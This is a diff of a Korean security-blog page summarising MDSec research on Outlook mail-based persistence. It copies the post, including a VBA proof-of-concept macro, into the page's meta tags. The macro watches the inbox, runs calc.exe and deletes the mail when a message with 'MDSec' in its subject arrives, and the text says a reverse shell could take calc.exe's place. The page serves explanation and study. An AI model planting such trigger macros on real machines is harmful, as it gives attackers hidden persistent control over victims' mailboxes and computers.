@@ -13,15 +13,69 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="hack &amp; life">
+  <meta name="description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/&#34;&gt;A Fresh Outlook on Mail Based Persistence&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;p&gt;Windows 10 Outlook&lt;/p&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;Outlook&amp;#xC740; Microsoft Office&amp;#xC758; &amp;#xC774;&amp;#xBA54;&amp;#xC77C; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xB85C; &amp;#xC77C;&amp;#xC815; &amp;#xAD00;&amp;#xB9AC;, &amp;#xC5F0;&amp;#xB77D;&amp;#xCC98; &amp;#xAD00;&amp;#xB9AC;, &amp;#xC77C;&amp;#xC9C0; &amp;#xB4F1;&amp;#xC758; &amp;#xB2E4;&amp;#xC591;&amp;#xD55C; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xC81C;&amp;#xACF5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xC911; &amp;#xB2E4;&amp;#xB978; Office &amp;#xC81C;&amp;#xD488;&amp;#xB4E4;&amp;#xACFC; &amp;#xB9C8;&amp;#xCC2C;&amp;#xAC00;&amp;#xC9C0;&amp;#xB85C; Outlook&amp;#xC740; VBA(Visaul Basic for Application) &amp;#xAE30;&amp;#xBC18; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xB97C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xAE30;&amp;#xB2A5;&amp;#xC774; &amp;#xC788;&amp;#xACE0;, &amp;#xD574;&amp;#xCEE4;&amp;#xB294; &amp;#xC774;&amp;#xB97C; &amp;#xC545;&amp;#xC6A9;&amp;#xD574; persistence access&amp;#xB97C; &amp;#xC5BB;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;Persistence access&amp;#xB780; &amp;#xD574;&amp;#xCEE4;&amp;#xAC00; victim&amp;#xC5D0; initial access&amp;#xB97C; &amp;#xD68D;&amp;#xB4DD;&amp;#xD55C; &amp;#xC774;&amp;#xD6C4;&amp;#xC5D0;&amp;#xB3C4; &amp;#xC9C0;&amp;#xC18D;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; access &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xC0C1;&amp;#xD0DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD2B9;&amp;#xC815; &amp;#xC81C;&amp;#xBAA9;&amp;#xC758; &amp;#xC774;&amp;#xBA54;&amp;#xC77C;&amp;#xC774; &amp;#xB3C4;&amp;#xCC29;&amp;#xD558;&amp;#xBA74; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70; &amp;#xB418;&amp;#xB294; &amp;#xC545;&amp;#xC131; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xB97C; victim&amp;#xC5D0; &amp;#xC2EC;&amp;#xC5B4;&amp;#xB193;&amp;#xC73C;&amp;#xBA74; &amp;#xD574;&amp;#xCEE4;&amp;#xB294; &amp;#xB2E8;&amp;#xC21C;&amp;#xD788; &amp;#xC774;&amp;#xBA54;&amp;#xC77C;&amp;#xC744; &amp;#xBCF4;&amp;#xB0B4;&amp;#xB294; &amp;#xAC83;&amp;#xB9CC;&amp;#xC73C;&amp;#xB85C; &amp;#xC6D0;&amp;#xACA9; &amp;#xC81C;&amp;#xC5B4;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;div class=&#34;caption&#34;&gt;&lt;span&gt;basic&lt;/span&gt;&lt;/div&gt;&lt;code class=&#34;hljs visual&#34;&gt;Option Explicit
+
+Private WithEvents olInboxItems As Items
+
+Private Sub Application_Startup()
+    Set olInboxItems = Session.GetDefaultFolder(olFolderInbox).Items
+End Sub
+
+Private Sub olInboxItems_ItemAdd(ByVal Item As Object)
+    On Error Resume Next
+    Dim olMailItem As MailItem
+    If TypeOf Item Is MailItem Then
+       If InStr(olMailItem.Subject, &amp;quot;MDSec&amp;quot;) &amp;gt; 0 Then
+            MsgBox &amp;quot;Hack The Planet&amp;quot;
+            Shell &amp;quot;calc.exe&amp;quot;
+            olMailItem.Delete
+        End If
+    End If
+    Set Item = Nothing
+    Set olMailItem = Nothing
+End Sub&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC704; POC &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; calc.exe&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; VBA &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC6B0;&amp;#xC120; Outlook&amp;#xC774; &amp;#xC2E4;&amp;#xD589;&amp;#xB410;&amp;#xC744; &amp;#xB54C;&amp;#xC758; &amp;#xC218;&amp;#xC2E0; &amp;#xBA54;&amp;#xC77C;&amp;#xD568; &amp;#xC0C1;&amp;#xD0DC;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4;&amp;#xC5D0; &amp;#xC0C8;&amp;#xB85C;&amp;#xC6B4; &amp;#xC774;&amp;#xBA54;&amp;#xC77C;&amp;#xC774; &amp;#xCD94;&amp;#xAC00;&amp;#xB418;&amp;#xBA74; &amp;#xADF8; &amp;#xC774;&amp;#xBA54;&amp;#xC77C;&amp;#xC758; &amp;#xC81C;&amp;#xBAA9;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xACE0;, &amp;#xB9CC;&amp;#xC57D; &amp;#xADF8; &amp;#xC81C;&amp;#xBAA9;&amp;#xC774; &amp;#x201C;MDSec&amp;#x201D;&amp;#xC774;&amp;#xB77C;&amp;#xBA74; calc.exe&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD55C; &amp;#xD6C4; &amp;#xD574;&amp;#xB2F9; &amp;#xC774;&amp;#xBA54;&amp;#xC77C;&amp;#xC744; &amp;#xC0AD;&amp;#xC81C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xC774;&amp;#xBA54;&amp;#xC77C;&amp;#xC758; &amp;#xC81C;&amp;#xBAA9;&amp;#xBFD0;&amp;#xB9CC; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C; &amp;#xBC1C;&amp;#xC2E0; &amp;#xC8FC;&amp;#xC18C; &amp;#xD639;&amp;#xC740; &amp;#xB0B4;&amp;#xC6A9; &amp;#xB4F1;&amp;#xC73C;&amp;#xB85C; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xC758; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70; &amp;#xC870;&amp;#xAC74;&amp;#xC744; &amp;#xB2E4;&amp;#xC591;&amp;#xD558;&amp;#xAC8C; &amp;#xC124;&amp;#xC815;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0;, calc.exe &amp;#xB300;&amp;#xC2E0; &amp;#xB9AC;&amp;#xBC84;&amp;#xC2A4; &amp;#xC258;&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; &amp;#xD574;&amp;#xCEE4;&amp;#xAC00; &amp;#xC6D0;&amp;#xACA9; &amp;#xC81C;&amp;#xC5B4;&amp;#xB97C; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+ - hack &amp; life">
   <meta name="author" content="j0dev, y2sman">
   <meta name="keywords" content>
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[하루한줄] Outlook Mail based Persistence access - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/&#34;&gt;A Fresh Outlook on Mail Based Persistence&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;p&gt;Windows 10 Outlook&lt;/p&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;Outlook&amp;#xC740; Microsoft Office&amp;#xC758; &amp;#xC774;&amp;#xBA54;&amp;#xC77C; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xB85C; &amp;#xC77C;&amp;#xC815; &amp;#xAD00;&amp;#xB9AC;, &amp;#xC5F0;&amp;#xB77D;&amp;#xCC98; &amp;#xAD00;&amp;#xB9AC;, &amp;#xC77C;&amp;#xC9C0; &amp;#xB4F1;&amp;#xC758; &amp;#xB2E4;&amp;#xC591;&amp;#xD55C; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xC81C;&amp;#xACF5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xC911; &amp;#xB2E4;&amp;#xB978; Office &amp;#xC81C;&amp;#xD488;&amp;#xB4E4;&amp;#xACFC; &amp;#xB9C8;&amp;#xCC2C;&amp;#xAC00;&amp;#xC9C0;&amp;#xB85C; Outlook&amp;#xC740; VBA(Visaul Basic for Application) &amp;#xAE30;&amp;#xBC18; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xB97C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xAE30;&amp;#xB2A5;&amp;#xC774; &amp;#xC788;&amp;#xACE0;, &amp;#xD574;&amp;#xCEE4;&amp;#xB294; &amp;#xC774;&amp;#xB97C; &amp;#xC545;&amp;#xC6A9;&amp;#xD574; persistence access&amp;#xB97C; &amp;#xC5BB;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;Persistence access&amp;#xB780; &amp;#xD574;&amp;#xCEE4;&amp;#xAC00; victim&amp;#xC5D0; initial access&amp;#xB97C; &amp;#xD68D;&amp;#xB4DD;&amp;#xD55C; &amp;#xC774;&amp;#xD6C4;&amp;#xC5D0;&amp;#xB3C4; &amp;#xC9C0;&amp;#xC18D;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; access &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xC0C1;&amp;#xD0DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD2B9;&amp;#xC815; &amp;#xC81C;&amp;#xBAA9;&amp;#xC758; &amp;#xC774;&amp;#xBA54;&amp;#xC77C;&amp;#xC774; &amp;#xB3C4;&amp;#xCC29;&amp;#xD558;&amp;#xBA74; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70; &amp;#xB418;&amp;#xB294; &amp;#xC545;&amp;#xC131; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xB97C; victim&amp;#xC5D0; &amp;#xC2EC;&amp;#xC5B4;&amp;#xB193;&amp;#xC73C;&amp;#xBA74; &amp;#xD574;&amp;#xCEE4;&amp;#xB294; &amp;#xB2E8;&amp;#xC21C;&amp;#xD788; &amp;#xC774;&amp;#xBA54;&amp;#xC77C;&amp;#xC744; &amp;#xBCF4;&amp;#xB0B4;&amp;#xB294; &amp;#xAC83;&amp;#xB9CC;&amp;#xC73C;&amp;#xB85C; &amp;#xC6D0;&amp;#xACA9; &amp;#xC81C;&amp;#xC5B4;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;div class=&#34;caption&#34;&gt;&lt;span&gt;basic&lt;/span&gt;&lt;/div&gt;&lt;code class=&#34;hljs visual&#34;&gt;Option Explicit
+
+Private WithEvents olInboxItems As Items
+
+Private Sub Application_Startup()
+    Set olInboxItems = Session.GetDefaultFolder(olFolderInbox).Items
+End Sub
+
+Private Sub olInboxItems_ItemAdd(ByVal Item As Object)
+    On Error Resume Next
+    Dim olMailItem As MailItem
+    If TypeOf Item Is MailItem Then
+       If InStr(olMailItem.Subject, &amp;quot;MDSec&amp;quot;) &amp;gt; 0 Then
+            MsgBox &amp;quot;Hack The Planet&amp;quot;
+            Shell &amp;quot;calc.exe&amp;quot;
+            olMailItem.Delete
+        End If
+    End If
+    Set Item = Nothing
+    Set olMailItem = Nothing
+End Sub&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC704; POC &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; calc.exe&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; VBA &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC6B0;&amp;#xC120; Outlook&amp;#xC774; &amp;#xC2E4;&amp;#xD589;&amp;#xB410;&amp;#xC744; &amp;#xB54C;&amp;#xC758; &amp;#xC218;&amp;#xC2E0; &amp;#xBA54;&amp;#xC77C;&amp;#xD568; &amp;#xC0C1;&amp;#xD0DC;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4;&amp;#xC5D0; &amp;#xC0C8;&amp;#xB85C;&amp;#xC6B4; &amp;#xC774;&amp;#xBA54;&amp;#xC77C;&amp;#xC774; &amp;#xCD94;&amp;#xAC00;&amp;#xB418;&amp;#xBA74; &amp;#xADF8; &amp;#xC774;&amp;#xBA54;&amp;#xC77C;&amp;#xC758; &amp;#xC81C;&amp;#xBAA9;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xACE0;, &amp;#xB9CC;&amp;#xC57D; &amp;#xADF8; &amp;#xC81C;&amp;#xBAA9;&amp;#xC774; &amp;#x201C;MDSec&amp;#x201D;&amp;#xC774;&amp;#xB77C;&amp;#xBA74; calc.exe&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD55C; &amp;#xD6C4; &amp;#xD574;&amp;#xB2F9; &amp;#xC774;&amp;#xBA54;&amp;#xC77C;&amp;#xC744; &amp;#xC0AD;&amp;#xC81C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xC774;&amp;#xBA54;&amp;#xC77C;&amp;#xC758; &amp;#xC81C;&amp;#xBAA9;&amp;#xBFD0;&amp;#xB9CC; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C; &amp;#xBC1C;&amp;#xC2E0; &amp;#xC8FC;&amp;#xC18C; &amp;#xD639;&amp;#xC740; &amp;#xB0B4;&amp;#xC6A9; &amp;#xB4F1;&amp;#xC73C;&amp;#xB85C; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xC758; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70; &amp;#xC870;&amp;#xAC74;&amp;#xC744; &amp;#xB2E4;&amp;#xC591;&amp;#xD558;&amp;#xAC8C; &amp;#xC124;&amp;#xC815;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0;, calc.exe &amp;#xB300;&amp;#xC2E0; &amp;#xB9AC;&amp;#xBC84;&amp;#xC2A4; &amp;#xC258;&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; &amp;#xD574;&amp;#xCEE4;&amp;#xAC00; &amp;#xC6D0;&amp;#xACA9; &amp;#xC81C;&amp;#xC5B4;&amp;#xB97C; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/img/1day1line.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2020/11/25/fabu1ous/2020-11-25/">
@@ -265,7 +319,6 @@ Private Sub olInboxItems_ItemAdd(ByVal Item As Object)
     Set Item = Nothing
     Set olMailItem = Nothing
 End Sub</code></pre>
-
 <p>&#xC704; POC &#xCF54;&#xB4DC;&#xB294; calc.exe&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; VBA &#xB9E4;&#xD06C;&#xB85C;&#xC785;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120; Outlook&#xC774; &#xC2E4;&#xD589;&#xB410;&#xC744; &#xB54C;&#xC758; &#xC218;&#xC2E0; &#xBA54;&#xC77C;&#xD568; &#xC0C1;&#xD0DC;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4;&#xC5D0; &#xC0C8;&#xB85C;&#xC6B4; &#xC774;&#xBA54;&#xC77C;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xBA74; &#xADF8; &#xC774;&#xBA54;&#xC77C;&#xC758; &#xC81C;&#xBAA9;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0;, &#xB9CC;&#xC57D; &#xADF8; &#xC81C;&#xBAA9;&#xC774; &#x201C;MDSec&#x201D;&#xC774;&#xB77C;&#xBA74; calc.exe&#xB97C; &#xC2E4;&#xD589;&#xD55C; &#xD6C4; &#xD574;&#xB2F9; &#xC774;&#xBA54;&#xC77C;&#xC744; &#xC0AD;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <p>&#xC774;&#xBA54;&#xC77C;&#xC758; &#xC81C;&#xBAA9;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xBC1C;&#xC2E0; &#xC8FC;&#xC18C; &#xD639;&#xC740; &#xB0B4;&#xC6A9; &#xB4F1;&#xC73C;&#xB85C; &#xB9E4;&#xD06C;&#xB85C;&#xC758; &#xD2B8;&#xB9AC;&#xAC70; &#xC870;&#xAC74;&#xC744; &#xB2E4;&#xC591;&#xD558;&#xAC8C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xACE0;, calc.exe &#xB300;&#xC2E0; &#xB9AC;&#xBC84;&#xC2A4; &#xC258;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xD574;&#xCEE4;&#xAC00; &#xC6D0;&#xACA9; &#xC81C;&#xC5B4;&#xB97C; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p>
 
@@ -285,9 +338,9 @@ End Sub</code></pre>
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/Fabu1ous/">Fabu1ous</a>
-                  
                   <a class="hover-with-bg" href="/tags/windows/">windows</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Fabu1ous/">Fabu1ous</a>
                   
                   <a class="hover-with-bg" href="/tags/outlook/">outlook</a>
                   
